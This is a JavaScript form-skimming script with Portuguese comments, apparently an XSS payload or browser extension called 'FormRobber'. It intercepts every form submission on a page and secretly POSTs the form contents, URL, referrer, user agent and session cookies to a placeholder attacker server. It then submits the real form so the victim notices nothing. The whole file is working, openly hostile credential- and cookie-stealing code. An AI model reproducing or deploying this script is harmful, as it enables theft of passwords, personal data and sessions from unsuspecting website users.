
// A URL para onde os dados serão enviados por POST.
// É recomendado usar HTTPS, porque algumas versões do Chrome não permitem HTTP.
var formSubmitURL = "https://SEU_SERVIDOR/xss/capture.php";

// Um ID qualquer que identifica as submissões enviadas por esse script especificamente.
var clientId = "_default";



function serializeFormData(form, url) {
	/* Essa função serializa os dados do formulário e mais algumas informações do usuário para serem enviados por POST. Essa função desconsidera arquivos para upload (e isso é uma melhoria que pode ser feita). */
	return "clientId=" + encodeURIComponent(clientId) + "&data=" + encodeURIComponent(form.serialize()) + "&url=" + encodeURIComponent(url) + "&referrer=" + encodeURIComponent(document.referrer) + "&userAgent=" + encodeURIComponent(navigator.userAgent) + "&cookie=" + encodeURIComponent(document.cookie);
}

function sendData(thisForm, selfURL, formCallback) {
	/* Essa função envia o formulário 'thisForm' escondido (AJAX) para outro servidor. */
	encodedData = serializeFormData(thisForm, selfURL); // Serializa os dados para enviar para o servidor.
	$.ajax({ // Faz a submissão dos dados escondido (AJAX).
		type: "POST",
		url: formSubmitURL,
		data: encodedData,
		complete: formCallback
	});
}


function activateFormRobbery() {
	/* Essa função ativa a extensão pra começar a roubar os dados do usuário */
	$("form").unbind("submit");
	$("form").submit(function(e) { // Para cada formulário que existir na página, quando o usuário submeter (enviar)...
		thisForm = $(this);
		e.preventDefault(); // Cancela e não submete (não envia).
		sendData(thisForm, location.href, function() { // Na verdade, pega esse formulário e, escondido, envia tudo para outro servidor...
			thisForm.unbind("submit");
			thisForm.submit(); // Quando terminar de enviar escondido, aí sim pode enviar o formulário de verdade, para que o usuário não note algo de estranho.
		});
	});
	console.log("A extensão FormRobber já foi ativada e está funcionando.");
}



window.onload = function() {
	activateFormRobbery(); // Quando a página terminar de carregar, iniciar ataque XSS.
	setTimeout("activateFormRobbery()", 5000); // Talvez a página gerou mais formulários após o carregamento, tentar capturar estes também.
}



